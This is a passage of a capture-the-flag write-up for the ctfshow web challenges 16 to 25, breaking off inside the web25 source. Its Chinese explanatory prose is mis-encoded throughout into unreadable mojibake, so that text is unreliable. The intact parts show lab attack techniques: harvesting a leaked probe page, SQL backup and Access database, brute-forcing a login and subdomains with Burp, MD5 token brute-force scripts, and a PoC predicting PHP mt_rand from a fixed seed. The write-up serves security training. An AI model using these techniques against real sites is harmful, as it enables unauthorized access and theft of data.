<img src="./assets/image-20241112203325025.png" alt="image-20241112203325025" style="zoom:50%;" />
<p>å¾—åˆ°ä¿¡æ¯ï¼Œç°å±…é™•è¥¿è¥¿å®‰</p>
<p>è¾“å…¥è¥¿å®‰æˆåŠŸé‡ç½®å¯†ç ï¼Œè¾“å…¥é‡ç½®å¯†ç å’Œå¸å·adminï¼ŒæˆåŠŸå¾—åˆ°flag</p>
<h4 id="web16">Web16<a hidden class="anchor" aria-hidden="true" href="#web16">#</a></h4>
<p>æ¢é’ˆæ³„æ¼</p>
<p>dirsearch æ‰«æä¸åˆ°è¿™ä¸ªæ¢é’ˆï¼Œçœ‹wpæ‰çŸ¥é“çš„</p>
<p>æ¢é’ˆåœ¨url/tz.php</p>
<p>è®¿é—®æ¢é’ˆ</p>
<p><img alt="image-20241112204025693" loading="lazy" src="./assets/image-20241112204025693.png"></p>
<p><img alt="image-20241112204437105" loading="lazy" src="./assets/image-20241112204437105.png"></p>
<p>åœ¨æŒ‡é’ˆé‡Œé¢å¯ä»¥æ‰¾åˆ°phpinfoé¡µé¢</p>
<p>æ‰“å¼€åœ¨phpinfoé‡Œé¢å¯ä»¥æ‰¾åˆ°flag</p>
<p><img loading="lazy" src="./assets/image-20241112204552383.png"></p>
<h4 id="web17">web17<a hidden class="anchor" aria-hidden="true" href="#web17">#</a></h4>
<p>sqlå¤‡ä»½æ³„æ¼</p>
<p><img alt="image-20241112205219664" loading="lazy" src="./assets/image-20241112205219664.png"></p>
<p>ç”¨dirsearchæ‰«å‡ºæ¥å­˜åœ¨sqlå¤‡ä»½æ³„æ¼ï¼Œä¸‹è½½backup.sqlï¼Œæ‰“å¼€å¾—åˆ°flag</p>
<p><img alt="image-20241112205527202" loading="lazy" src="./assets/image-20241112205527202.png"></p>
<h4 id="web18">web18<a hidden class="anchor" aria-hidden="true" href="#web18">#</a></h4>
<p>æœ¬é¢˜æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œç©åˆ°101åˆ†å°±èƒ½å¾—åˆ°flag</p>
<p>æˆ‘ä»¬ç›´æ¥çœ‹js</p>
<p>Flappy_js.js</p>
<p><img alt="image-20241113125910231" loading="lazy" src="assets/image-20241113125910231.png"></p>
<p>å®¡ä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“åˆ†æ•°å¤§äº100çš„æ—¶å€™ä¼šè¾“å‡ºè¿™æ®µæ–‡å­—ï¼Œè¿™æ®µæ–‡å­—çœ‹ç€åƒunidcodeç¼–ç ï¼Œè§£ç è¯•è¯•</p>
<p><img alt="image-20241113130107163" loading="lazy" src="assets/image-20241113130107163.png"></p>
<p>æ ¹æ®æç¤ºè®¿é—®url/110.php,å¾—åˆ°flag</p>
<h4 id="web19">web19<a hidden class="anchor" aria-hidden="true" href="#web19">#</a></h4>
<p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œæ ¹æ®hintæŸ¥çœ‹ç½‘é¡µæºä»£ç </p>
<p><img alt="image-20241113132533968" loading="lazy" src="assets/image-20241113132533968.png"></p>
<p>æ ¹æ®æç¤ºï¼Œè¿™é“é¢˜åº”è¯¥æ˜¯ä¸€é“å¯¹å¯†ç è¿›è¡Œäº†åŠ å¯†çš„é¢˜ç›®</p>
<p>å®¡é˜…ä¸€ä¸‹ä»£ç æˆ‘ä»¬å¾—åˆ°è¿™äº›ä¿¡æ¯</p>
<blockquote>
<p>modeæ¨¡å¼ï¼š CBC padding å¡«å……æ–¹å¼ï¼š ZeroPadding
å¯†æ–‡è¾“å‡ºç¼–ç ï¼š åå…­è¿›åˆ¶hex åç§»é‡iv: ilove36dverymuch å¯†é’¥ï¼š0000000372619038
å¯†æ–‡ä¸ºï¼š a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p></blockquote>
<p><a href="https://www.toolhelper.cn/SymmetricEncryption/AES">AES åŠ å¯†/è§£å¯† - é”¤å­åœ¨çº¿å·¥å…·</a></p>
<p>ç”¨è§£å¯†å·¥å…·è§£å¯†ä¸€ä¸‹å¯†æ–‡æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¯†ç ä¸º</p>
<p><img alt="image-20241113133003036" loading="lazy" src="assets/image-20241113133003036.png"></p>
<p>è¾“å…¥å¯†ç ï¼Œå¾—åˆ°flag</p>
<h4 id="web20">web20<a hidden class="anchor" aria-hidden="true" href="#web20">#</a></h4>
<blockquote>
<p>hintï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p></blockquote>
<p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨accessæ•°æ®åº“çš„aspç¨‹åº</p>
<p>æ ¹æ®æç¤ºæœ¬é¢˜å­˜åœ¨mdbæ–‡ä»¶æ³„éœ²ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è®¿é—®url/db/db.mdb</p>
<p>ä¸‹è½½db.mdbæ–‡ä»¶åç”¨è®°äº‹æœ¬æ‰“å¼€æœç´¢flagï¼Œå³å¯å¾—åˆ° flag{ctfshow_old_database}</p>
<p><img alt="image-20241113134305246" loading="lazy" src="assets/image-20241113134305246.png"></p>
<h3 id="çˆ†ç ´å®Œå·¥">çˆ†ç ´ï¼šï¼ˆå®Œå·¥ï¼‰<a hidden class="anchor" aria-hidden="true" href="#çˆ†ç ´å®Œå·¥">#</a></h3>
<h4 id="web21">web21<a hidden class="anchor" aria-hidden="true" href="#web21">#</a></h4>
<p><img alt="image-20241123165104490" loading="lazy" src="assets/image-20241123165104490.png"></p>
<p>æŠ“ä¸ªåŒ…</p>
<p><img alt="image-20241123165621808" loading="lazy" src="assets/image-20241123165621808.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„è´¦å·å¯†ç æ˜¯é€šè¿‡base64ç¼–ç åŠ å¯†åå†å‘é€çš„ï¼Œé—®é¢˜ä¸å¤§</p>
<p>payloadè®¾ç½®å¦‚ä¸‹</p>
<p><img alt="image-20241123165947562" loading="lazy" src="assets/image-20241123165947562.png"></p>
<p><img alt="image-20241123170139759" loading="lazy" src="assets/image-20241123170139759.png"></p>
<p>æˆ‘ä»¬è¿˜è¦è®¾ç½®ä¸€ä¸‹payloadå¤„ç†</p>
<p><img alt="image-20241123170509504" loading="lazy" src="assets/image-20241123170509504.png"></p>
<p>å¼€å§‹çˆ†ç ´ï¼Œæ ¹æ®é•¿åº¦æˆ–è€…çŠ¶æ€ç åˆ¤æ–­å³å¯</p>
<p><img alt="image-20241123172859359" loading="lazy" src="assets/image-20241123172859359.png"></p>
<h4 id="web22">web22<a hidden class="anchor" aria-hidden="true" href="#web22">#</a></h4>
<p>åŸŸåçˆ†ç ´</p>
<p>é€šè¿‡çˆ†ç ´ctf.showçš„å­åŸŸåå¯ä»¥çˆ†ç ´åˆ°flag.ctf.show</p>
<p>è®¿é—®å³å¯å¾—åˆ°flag(è™½ç„¶å·²ç»æŒ‚äº†)</p>
<h4 id="web23">web23<a hidden class="anchor" aria-hidden="true" href="#web23">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 11:43:51
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 11:56:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$token</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">===</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">===</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span><span class="mi">1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">+</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">+</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">/</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">===</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>åˆ†æä»£ç å¯çŸ¥ï¼š éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ token å€¼ï¼Œä½¿å¾—ä»¥ä¸‹æ¡ä»¶æˆç«‹ï¼š</p>
<p>1ã€md5(token) çš„ç¬¬ 1 ä½ï¼ˆä» 0 å¼€å§‹ç®—ï¼‰ç­‰äºç¬¬ 14 ä½</p>
<p>2ã€md5(token) çš„ç¬¬ 14 ä½ç­‰äºç¬¬ 17 ä½ã€‚</p>
<p>3ã€md5(token) çš„ç¬¬ 1 ä½çš„æ•´æ•°å€¼ã€14 ä½çš„æ•´æ•°å€¼ã€å’Œ 17 ä½çš„æ•´æ•°å€¼çš„å’Œé™¤ä»¥ç¬¬ 1 ä½çš„æ•´æ•°å€¼ç­‰äºç¬¬ 31 ä½çš„æ•´æ•°å€¼ã€‚</p>
<p>æ—¢ç„¶ä¸çŸ¥é“æ€ä¹ˆå‡‘é‚£æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´</p>
<p>é€šè¿‡bpçˆ†ç ´ä¸€ä¸‹1-1000ä¸­æ˜¯å¦æœ‰ç¬¦åˆä¸Šè¿°æ¡ä»¶çš„å­—ç¬¦ä¸²</p>
<p><img alt="image-20241123230839908" loading="lazy" src="assets/image-20241123230839908.png"></p>
<p>å“æˆ‘è‰ï¼Œæ€ä¹ˆå°±çˆ†ç ´å‡ºæ¥äº†ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆçº¯æ•°å­—è¿˜èƒ½çˆ†å‡ºæ¥</p>
<p>å…¶ä»–è§£æ³•ï¼Œå¯ä»¥ç”¨å¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># coding: utf-8</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># alberthao</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">dic</span> <span class="o">=</span> <span class="s1">&#39;0123456789qazwsxedcrfvtgbyhnujmikolp&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># print md5</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># print md5[1:2]</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="c1"># print md5[14:15]</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># print md5[17:18]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="ow">and</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="o">==</span> <span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">                        <span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]))</span> <span class="o">/</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">]):</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span> <span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">or</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="o">!=</span> <span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="k">continue</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">&gt;=</span><span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">&lt;=</span><span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">]))</span><span class="o">&gt;=</span><span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">])</span><span class="o">&lt;=</span><span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">	<span class="k">if</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">]))</span><span class="o">/</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">==</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">])):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web24">web24<a hidden class="anchor" aria-hidden="true" href="#web24">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 13:26:39
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 13:53:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="mi">372619038</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">===</span><span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">())){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /proc/version&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªphpä¼ªéšæœºæ•°çš„é¢˜ç›®</p>
<blockquote>
<p>mt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœº æ•°ã€‚ æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•° å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seedå‚æ•° ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•° æ˜¯ä¸€æ ·çš„</p></blockquote>
<p>è™½ç„¶è¯´æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯åŒä¸€ä¸ªç§å­ä¼šç”ŸæˆåŒä¸€ä¸²æ•°å­—</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">372619038</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">());</span> 
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>ä¸çŸ¥é“è·Ÿç‰ˆæœ¬æœ‰æ²¡æœ‰å…³ç³»ï¼Œæˆ‘éšä¾¿æ‰¾çš„phpåœ¨çº¿è¿è¡Œï¼ŒæˆåŠŸå¾—åˆ°flag</p>
<h4 id="web25">web25<a hidden class="anchor" aria-hidden="true" href="#web25">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 13:56:57
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 15:47:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
